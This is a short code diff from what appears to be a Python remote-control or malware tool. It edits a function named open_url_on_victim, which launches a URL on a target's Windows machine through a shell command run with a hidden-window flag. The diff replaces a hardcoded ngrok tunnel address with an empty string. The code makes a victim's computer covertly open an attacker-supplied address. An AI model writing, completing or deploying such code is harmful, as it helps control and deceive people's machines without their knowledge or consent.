@@ -352,7 +352,7 @@ try:
     # OPEN URL
     # ======================================================
     def open_url_on_victim():
-        url = "https://reformist-handed-trapping.ngrok-free.dev"
+        url = ""
         try:
             subprocess.Popen(f'start {url}', shell=True, creationflags=NO_WINDOW_FLAG)
             time.sleep(2)
